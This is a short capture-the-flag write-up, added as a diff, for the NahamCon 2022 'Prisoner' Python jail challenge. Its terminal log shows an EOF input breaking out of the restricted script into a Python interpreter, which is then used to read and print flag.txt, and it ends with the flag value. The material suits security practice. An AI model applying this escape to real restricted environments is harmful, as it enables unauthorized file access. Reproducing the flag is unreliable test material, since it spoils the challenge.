@@ -1,0 +1,39 @@
+Prisoner
+50 points - Warmups - 1147 Solves - easy
+Author: @JohnHammond#6971
+
+Have you ever broken out of jail? Maybe it is easier than you think!
+
+PS (not challenge related), thank you so much to Zero-Point Security for supporting NahamCon 2022!
+
+
+Hello prisoner, welcome to jail.
+Don't get any ideas, there is no easy way out!
+: Traceback (most recent call last):
+  File "/home/user/jail.py", line 27, in <module>
+    input(": ")
+EOFError
+>>> import
+  File "<stdin>", line 1
+    import
+         ^
+SyntaxError: invalid syntax
+>>> d
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'd' is not defined
+>>> "aa"
+'aa'
+>>> "exit"
+'exit'
+>>> exit
+Use exit() or Ctrl-D (i.e. EOF) to exit
+>>> print(xx)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'xx' is not defined
+>>> print("xx")
+xx
+>>> f = open("flag.txt", "r")
+>>> print(f.read())
+flag{c31e05a24493a202fad0d1a827103642}
